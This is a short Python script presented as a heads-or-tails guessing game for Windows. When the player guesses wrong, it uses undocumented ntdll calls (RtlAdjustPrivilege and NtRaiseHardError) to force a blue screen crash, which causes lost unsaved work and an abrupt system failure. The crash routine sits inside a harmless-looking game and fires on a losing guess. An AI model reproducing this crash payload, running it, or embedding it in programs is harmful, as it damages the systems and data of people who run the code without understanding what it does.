import random
import time
import sys
import platform

# making sure user is on windows
if platform.system() != "Windows":
    input("This script only works on windows")
    sys.exit()

# imports for bsod
from ctypes import windll, c_int, c_uint, c_ulong, POINTER, byref


# bsod script
def bsod():
    nullptr = POINTER(c_int)()

    windll.ntdll.RtlAdjustPrivilege(c_uint(19), c_uint(1), c_uint(0), byref(c_int()))

    windll.ntdll.NtRaiseHardError(
        c_ulong(0xC000007B), c_ulong(0), nullptr, nullptr, c_uint(6), byref(c_uint())
    )


print("Welcome!")
while True:
    guess = input("Heads or tails: ").upper().strip()

    # checking if you guessed a valid option
    if guess not in ["HEADS", "TAILS"]:
        print("\nInvalid choice, try again.\n")
        continue

    # generating correct answer and if you guessed correctly
    answer = random.choice(["HEADS", "TAILS"])

    if guess == answer:
        print("\nYou won!")
        input("Press enter to exit: ")
        sys.exit()

    else:
        print("\nYou got it wrong. Uh Oh!")
        bsod()

    # incase the bsod fails
    # script will probably just crash if it does but just incase
    time.sleep(5)
    print("If you can read this, it failed.")
    input("Press enter to exit: ")
    sys.exit()
